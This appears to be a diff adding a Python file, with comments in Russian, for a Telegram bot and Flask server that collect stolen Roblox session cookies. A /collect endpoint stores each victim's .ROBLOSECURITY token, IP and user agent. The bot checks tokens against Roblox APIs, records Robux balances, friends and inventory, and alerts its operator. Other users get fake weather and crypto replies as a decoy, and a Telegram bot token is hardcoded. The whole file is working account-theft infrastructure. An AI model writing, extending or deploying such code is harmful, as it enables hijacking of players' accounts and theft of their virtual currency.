@@ -1,0 +1,464 @@
+# bot.py
+import os
+import sys
+import json
+import sqlite3
+import requests
+import time
+import threading
+import logging
+import re
+import random
+from datetime import datetime
+from typing import Dict, List, Optional
+from flask import Flask, request, jsonify
+import telebot
+from telebot.types import InlineKeyboardMarkup
+
+# ===== КОНФИГ =====
+BOT_TOKEN = "8768415734:AAHrgchGSZnpjjR7YMtLUhonDp_X4cVfmcs"
+MASTER_ID = 8511491600
+DB_PATH = "/tmp/roblox_sessions.db"
+LOG_FILE = "/tmp/roblox_bot.log"
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()]
+)
+logger = logging.getLogger('RobloxBot')
+
+# ===== БАЗА ДАННЫХ =====
+class Database:
+    def __init__(self):
+        self.db_path = DB_PATH
+        self._init_db()
+        
+    def _init_db(self):
+        conn = sqlite3.connect(self.db_path)
+        c = conn.cursor()
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS sessions (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                token TEXT UNIQUE NOT NULL,
+                status TEXT DEFAULT 'pending',
+                validated INTEGER DEFAULT 0,
+                roblox_username TEXT,
+                roblox_id INTEGER,
+                robux INTEGER DEFAULT 0,
+                membership TEXT,
+                ip TEXT,
+                user_agent TEXT,
+                created_at TEXT,
+                updated_at TEXT
+            )
+        ''')
+        c.execute('CREATE INDEX IF NOT EXISTS idx_status ON sessions(status)')
+        c.execute('CREATE INDEX IF NOT EXISTS idx_username ON sessions(roblox_username)')
+        conn.commit()
+        conn.close()
+        logger.info("База данных инициализирована")
+        
+    def add_session(self, token: str, ip: str = None, ua: str = None) -> bool:
+        try:
+            conn = sqlite3.connect(self.db_path)
+            c = conn.cursor()
+            now = datetime.now().isoformat()
+            c.execute('''
+                INSERT OR IGNORE INTO sessions 
+                (token, status, ip, user_agent, created_at, updated_at)
+                VALUES (?, 'pending', ?, ?, ?, ?)
+            ''', (token, ip, ua, now, now))
+            conn.commit()
+            conn.close()
+            return True
+        except Exception as e:
+            logger.error(f"Ошибка добавления: {e}")
+            return False
+            
+    def get_pending(self) -> List[Dict]:
+        conn = sqlite3.connect(self.db_path)
+        c = conn.cursor()
+        c.execute('SELECT id, token, ip, user_agent FROM sessions WHERE status = "pending" ORDER BY created_at ASC')
+        rows = c.fetchall()
+        conn.close()
+        return [{'id': r[0], 'token': r[1], 'ip': r[2], 'ua': r[3]} for r in rows]
+        
+    def get_active(self, limit: int = 50) -> List[Dict]:
+        conn = sqlite3.connect(self.db_path)
+        c = conn.cursor()
+        c.execute('''
+            SELECT id, token, roblox_username, roblox_id, robux, membership, created_at, ip
+            FROM sessions 
+            WHERE status = 'active' 
+            ORDER BY created_at DESC 
+            LIMIT ?
+        ''', (limit,))
+        rows = c.fetchall()
+        conn.close()
+        return [{'id': r[0], 'token': r[1], 'username': r[2] or 'Unknown', 'user_id': r[3] or 0, 
+                 'robux': r[4] or 0, 'membership': r[5] or 'None', 'created_at': r[6], 'ip': r[7]} for r in rows]
+        
+    def update_session(self, session_id: int, data: dict) -> bool:
+        try:
+            conn = sqlite3.connect(self.db_path)
+            c = conn.cursor()
+            fields = []
+            values = []
+            for k, v in data.items():
+                fields.append(f"{k} = ?")
+                values.append(v)
+            values.append(datetime.now().isoformat())
+            values.append(session_id)
+            c.execute(f"UPDATE sessions SET {', '.join(fields)}, updated_at = ? WHERE id = ?", values)
+            conn.commit()
+            conn.close()
+            return True
+        except Exception as e:
+            logger.error(f"Ошибка обновления: {e}")
+            return False
+            
+    def delete_session(self, session_id: int) -> bool:
+        try:
+            conn = sqlite3.connect(self.db_path)
+            c = conn.cursor()
+            c.execute('DELETE FROM sessions WHERE id = ?', (session_id,))
+            conn.commit()
+            conn.close()
+            return True
+        except:
+            return False
+            
+    def clear_all(self) -> int:
+        conn = sqlite3.connect(self.db_path)
+        c = conn.cursor()
+        c.execute('DELETE FROM sessions')
+        count = c.rowcount
+        conn.commit()
+        conn.close()
+        return count
+        
+    def get_stats(self) -> dict:
+        conn = sqlite3.connect(self.db_path)
+        c = conn.cursor()
+        c.execute('SELECT COUNT(*) FROM sessions')
+        total = c.fetchone()[0]
+        c.execute('SELECT COUNT(*) FROM sessions WHERE status = "active"')
+        active = c.fetchone()[0]
+        c.execute('SELECT COUNT(*) FROM sessions WHERE status = "pending"')
+        pending = c.fetchone()[0]
+        c.execute('SELECT SUM(robux) FROM sessions WHERE status = "active"')
+        robux = c.fetchone()[0] or 0
+        conn.close()
+        return {'total': total, 'active': active, 'pending': pending, 'robux': robux}
+        
+    def get_by_id(self, session_id: int) -> Optional[Dict]:
+        conn = sqlite3.connect(self.db_path)
+        c = conn.cursor()
+        c.execute('SELECT * FROM sessions WHERE id = ?', (session_id,))
+        row = c.fetchone()
+        conn.close()
+        if row:
+            return {'id': row[0], 'token': row[1], 'status': row[2], 'validated': row[3],
+                    'username': row[4], 'user_id': row[5], 'robux': row[6], 'membership': row[7],
+                    'ip': row[8], 'ua': row[9], 'created_at': row[10]}
+        return None
+
+# ===== ВАЛИДАТОР =====
+class RobloxValidator:
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
+            'Accept': 'application/json'
+        })
+        
+    def validate(self, token: str) -> bool:
+        try:
+            resp = self.session.get(
+                'https://www.roblox.com/mobileapi/userinfo',
+                cookies={'.ROBLOSECURITY': token},
+                timeout=10
+            )
+            return resp.status_code == 200
+        except:
+            return False
+            
+    def get_info(self, token: str) -> dict:
+        try:
+            resp = self.session.get(
+                'https://www.roblox.com/mobileapi/userinfo',
+                cookies={'.ROBLOSECURITY': token},
+                timeout=10
+            )
+            if resp.status_code == 200:
+                data = resp.json()
+                return {
+                    'username': data.get('UserName', 'Unknown'),
+                    'user_id': data.get('UserID', 0),
+                    'robux': data.get('RobuxBalance', 0),
+                    'membership': data.get('MembershipType', 'None')
+                }
+        except Exception as e:
+            logger.error(f"Ошибка получения инфы: {e}")
+        return {}
+        
+    def get_full_info(self, token: str) -> dict:
+        info = self.get_info(token)
+        if info and info.get('user_id'):
+            try:
+                user_id = info['user_id']
+                # Друзья
+                resp = self.session.get(
+                    f'https://friends.roblox.com/v1/users/{user_id}/friends/count',
+                    timeout=5
+                )
+                if resp.status_code == 200:
+                    info['friends'] = resp.json().get('count', 0)
+                # Инвентарь
+                resp = self.session.get(
+                    f'https://inventory.roblox.com/v2/users/{user_id}/inventory',
+                    params={'limit': 1},
+                    timeout=5
+                )
+                if resp.status_code == 200:
+                    info['inventory'] = resp.json().get('total', 0)
+            except:
+                pass
+        return info
+
+# ===== ОСНОВНОЙ БОТ =====
+class RobloxBot:
+    def __init__(self):
+        self.bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
+        self.db = Database()
+        self.validator = RobloxValidator()
+        self.waiting = {}
+        self._register_handlers()
+        
+    def _register_handlers(self):
+        @self.bot.message_handler(commands=['start'])
+        def start(message):
+            if message.from_user.id != MASTER_ID:
+                self.bot.reply_to(message, "🌤️ Weather Forecast: send /weather CITY")
+                return
+            self.bot.reply_to(
+                message,
+                "🔐 Roblox Session Bot\n"
+                "━━━━━━━━━━━━━━━━━\n"
+                "/pull - Принять токен\n"
+                "/validate - Проверить все\n"
+                "/list - Список активных\n"
+                "/info ID - Инфо о сессии\n"
+                "/delete ID - Удалить\n"
+                "/clear - Очистить всё\n"
+                "/stats - Статистика"
+            )
+            
+        @self.bot.message_handler(func=lambda m: m.from_user.id == MASTER_ID)
+        def master_handler(message):
+            text = message.text.strip()
+            user_id = message.from_user.id
+            
+            # Ожидание ввода токена
+            if self.waiting.get(user_id) == 'token':
+                token = text.split('=')[-1].replace('.ROBLOSECURITY', '').strip(' _-"\'').strip()
+                if len(token) > 50 and re.match(r'^[a-zA-Z0-9_\-]+$', token):
+                    if self.db.add_session(token):
+                        self.bot.reply_to(message, "✅ Токен сохранён. /validate для проверки")
+                    else:
+                        self.bot.reply_to(message, "⚠️ Токен уже есть в базе")
+                else:
+                    self.bot.reply_to(message, "❌ Неверный формат токена")
+                self.waiting.pop(user_id, None)
+                return
+                
+            # Команды
+            if text == '/pull':
+                self.bot.reply_to(message, "📥 Отправь .ROBLOSECURITY=токен")
+                self.waiting[user_id] = 'token'
+                return
+                
+            if text == '/validate':
+                pending = self.db.get_pending()
+                if not pending:
+                    self.bot.reply_to(message, "✅ Нет ожидающих сессий")
+                    return
+                    
+                self.bot.reply_to(message, f"⏳ Проверка {len(pending)} сессий...")
+                valid = 0
+                for sess in pending:
+                    token = sess['token']
+                    if self.validator.validate(token):
+                        info = self.validator.get_full_info(token)
+                        self.db.update_session(sess['id'], {
+                            'status': 'active',
+                            'validated': 1,
+                            'roblox_username': info.get('username'),
+                            'roblox_id': info.get('user_id'),
+                            'robux': info.get('robux', 0),
+                            'membership': info.get('membership', 'None')
+                        })
+                        valid += 1
+                        msg = (
+                            f"✅ {info.get('username')}\n"
+                            f"ID: {info.get('user_id')}\n"
+                            f"💰 Robux: {info.get('robux', 0)}\n"
+                            f"📦 Premium: {info.get('membership')}\n"
+                            f"👥 Друзей: {info.get('friends', 0)}\n"
+                            f"🎒 Инвентарь: {info.get('inventory', 0)}\n"
+                            f"🌐 IP: {sess.get('ip', 'N/A')}"
+                        )
+                        self.bot.send_message(user_id, msg)
+                    else:
+                        self.db.update_session(sess['id'], {'status': 'invalid'})
+                        
+                self.bot.reply_to(message, f"✅ Валидно: {valid} из {len(pending)}")
+                return
+                
+            if text == '/list':
+                active = self.db.get_active()
+                if not active:
+                    self.bot.reply_to(message, "📭 Нет активных сессий")
+                    return
+                resp = "📋 Активные сессии:\n━━━━━━━━━━━━━━━\n"
+                for s in active:
+                    resp += f"#{s['id']} {s['username']} | 💰{s['robux']} | {s['membership']}\n"
+                resp += f"\nВсего: {len(active)}"
+                self.bot.reply_to(message, resp)
+                return
+                
+            if text.startswith('/info '):
+                try:
+                    sid = int(text.split()[1])
+                    sess = self.db.get_by_id(sid)
+                    if sess:
+                        resp = (
+                            f"📄 Сессия #{sess['id']}\n"
+                            f"Токен: {sess['token'][:30]}...\n"
+                            f"Статус: {sess['status']}\n"
+                            f"Имя: {sess['username'] or 'N/A'}\n"
+                            f"ID: {sess['user_id'] or 'N/A'}\n"
+                            f"Robux: {sess['robux'] or 0}\n"
+                            f"Premium: {sess['membership'] or 'None'}\n"
+                            f"IP: {sess['ip'] or 'N/A'}\n"
+                            f"Создана: {sess['created_at']}"
+                        )
+                        self.bot.reply_to(message, resp)
+                    else:
+                        self.bot.reply_to(message, "❌ Не найдена")
+                except:
+                    self.bot.reply_to(message, "❌ Используй: /info ID")
+                return
+                
+            if text.startswith('/delete '):
+                try:
+                    sid = int(text.split()[1])
+                    if self.db.delete_session(sid):
+                        self.bot.reply_to(message, f"🗑️ Удалена #{sid}")
+                    else:
+                        self.bot.reply_to(message, "❌ Не найдена")
+                except:
+                    self.bot.reply_to(message, "❌ Используй: /delete ID")
+                return
+                
+            if text == '/clear':
+                count = self.db.clear_all()
+                self.bot.reply_to(message, f"🗑️ Удалено {count} сессий")
+                return
+                
+            if text == '/stats':
+                s = self.db.get_stats()
+                resp = (
+                    f"📊 Статистика\n━━━━━━━━━━━━━━━\n"
+                    f"Всего: {s['total']}\n"
+                    f"Активных: {s['active']}\n"
+                    f"Ожидает: {s['pending']}\n"
+                    f"💰 Всего Robux: {s['robux']}"
+                )
+                self.bot.reply_to(message, resp)
+                return
+                
+            self.bot.reply_to(message, "❓ Неизвестно. /start")
+            
+        @self.bot.message_handler(func=lambda m: m.from_user.id != MASTER_ID)
+        def fake_handler(message):
+            fake = [
+                "🌤️ +22°C, Cloudy, London",
+                "💹 BTC: $44,250 (+2.1%)",
+                "📊 ETH: $3,120 (+0.8%)",
+                "☀️ Sunny, +28°C, Madrid",
+                "🌧️ Rain, +15°C, Tokyo",
+                "❄️ Snow, -5°C, Moscow",
+                "🌀 Hurricane warning, Florida",
+                "📈 S&P 500: +0.3%",
+            ]
+            self.bot.reply_to(message, random.choice(fake))
+            
+    def run(self):
+        logger.info("🚀 Бот запущен")
+        while True:
+            try:
+                self.bot.polling(none_stop=True, interval=1)
+            except Exception as e:
+                logger.error(f"Ошибка: {e}")
+                time.sleep(5)
+
+# ===== FLASK ДЛЯ ПРИЁМА ВЕБХУКОВ =====
+flask_app = Flask(__name__)
+db = Database()
+
+@flask_app.route('/collect', methods=['POST'])
+def collect():
+    try:
+        data = request.json or {}
+        token = data.get('token') or data.get('cookie') or data.get('.ROBLOSECURITY')
+        ip = request.remote_addr
+        ua = request.headers.get('User-Agent', 'Unknown')
+        
+        if not token:
+            return jsonify({'status': 'error', 'message': 'no token'}), 400
+            
+        token = token.replace('.ROBLOSECURITY', '').strip(' _-"\'').strip()
+        if len(token) < 50:
+            return jsonify({'status': 'error', 'message': 'invalid token'}), 400
+            
+        if db.add_session(token, ip, ua):
+            try:
+                import telebot
+                bot = telebot.TeleBot(BOT_TOKEN)
+                bot.send_message(
+                    MASTER_ID,
+                    f"🆕 Новая сессия!\n"
+                    f"📝 Токен: {token[:30]}...\n"
+                    f"🌐 IP: {ip}\n"
+                    f"📱 UA: {ua[:50]}"
+                )
+            except:
+                pass
+            logger.info(f"Получен токен от {ip}")
+            return jsonify({'status': 'ok', 'message': 'session saved'})
+        else:
+            return jsonify({'status': 'error', 'message': 'duplicate'}), 400
+            
+    except Exception as e:
+        logger.error(f"Ошибка /collect: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@flask_app.route('/health', methods=['GET'])
+def health():
+    return jsonify({
+        'status': 'running',
+        'sessions': db.get_stats()['total'],
+        'master_id': MASTER_ID
+    })
+
+def start_flask():
+    port = int(os.environ.get('PORT', 5000))
+    flask_app.run(host='0.0.0.0', port=port, debug=False)
+
+if __name__ == '__main__':
+    import threading
+    threading.Thread(target=start_flask, daemon=True).start()
+    bot = RobloxBot()
+    bot.run()
